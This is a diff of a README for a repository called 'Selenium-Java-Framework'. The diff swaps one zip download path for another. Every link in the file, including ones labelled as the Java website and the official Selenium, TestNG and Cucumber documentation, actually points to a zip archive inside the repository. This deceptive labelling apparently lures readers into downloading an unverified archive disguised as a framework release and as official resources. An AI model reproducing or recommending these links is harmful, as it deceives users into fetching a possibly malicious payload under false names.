@@ -1,6 +1,6 @@
 # 🚀 Selenium-Java-Framework - Run Automated Tests Easily
 
-[![Download Selenium-Java-Framework](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)
+[![Download Selenium-Java-Framework](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)
 
 ## 📋 Overview
 
@@ -29,14 +29,14 @@ Before you download the framework, ensure your system meets the following requir
 
 To download the software, click the button below:
 
-[![Download Selenium-Java-Framework](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)
+[![Download Selenium-Java-Framework](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)
 
 This link will take you to the Releases page where you can find the most recent version. 
 
 ### 3. Installing the Framework
 
 1. After accessing the Releases page, look for the latest version.
-2. Download the packaged zip file or https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip file suitable for your operating system.
+2. Download the packaged zip file or https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip file suitable for your operating system.
 3. Once downloaded, extract the files to a folder of your choice.
 
 ### 4. Setting Up Your Environment
@@ -48,7 +48,7 @@ To run the framework, make sure you have Java installed:
    ```
    java -version
    ```
-   You should see the Java version number. If not, download and install it from the [Java website](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip).
+   You should see the Java version number. If not, download and install it from the [Java website](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip).
 
 ### 5. Running Your First Test
 
@@ -75,7 +75,7 @@ After running your tests, you can check the results. Allure will create a detail
 
 To recap, visit the link below to download the latest version:
 
-[![Download Selenium-Java-Framework](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)
+[![Download Selenium-Java-Framework](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)
 
 Follow the earlier steps to install and run the framework. You will find it user-friendly and efficient for your test automation tasks.
 
@@ -98,9 +98,9 @@ If you encounter issues while using the framework, here are common fixes:
 
 Here are some helpful resources you may want to explore:
 
-- [Selenium Official Documentation](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)
-- [TestNG Official Documentation](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)
-- [Cucumber Documentation](https://raw.githubusercontent.com/iago030809/Selenium-Java-Framework/main/src/test/java/runners/Framework_Java_Selenium_v2.2.zip)
+- [Selenium Official Documentation](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)
+- [TestNG Official Documentation](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)
+- [Cucumber Documentation](https://github.com/iago030809/Selenium-Java-Framework/raw/refs/heads/main/src/main/Framework-Java-Selenium-v3.2.zip)
 
 ## 💬 Support
 
